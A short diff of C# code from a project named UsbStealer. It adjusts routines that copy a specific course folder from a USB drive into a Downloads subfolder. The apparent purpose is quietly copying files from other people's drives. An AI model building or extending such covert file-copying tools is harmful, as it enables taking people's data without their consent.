@@ -36,7 +36,7 @@ namespace UsbStealer
                     {
                         Console.WriteLine(dinfo.Name);
                         var path = dinfo.Name + @"смолгу\!для занятий\4П7_АИС";
-                        //var newPath = new KnownFolder(KnownFolderType.Downloads).Path + @"\нужное";
+                        
                         var newPath = KnownFolders.GetPath(KnownFolder.Downloads) + @"\нужное";
                         if (Directory.Exists(path))
                         {
@@ -71,6 +71,7 @@ namespace UsbStealer
 
         private static void CreateDirectoies(string path, string newPath)
         {
+            Directory.CreateDirectory(path.Replace(path, newPath));
             var directories = Directory.GetDirectories(path, "*", SearchOption.AllDirectories);
             foreach (var directory in directories)
             {
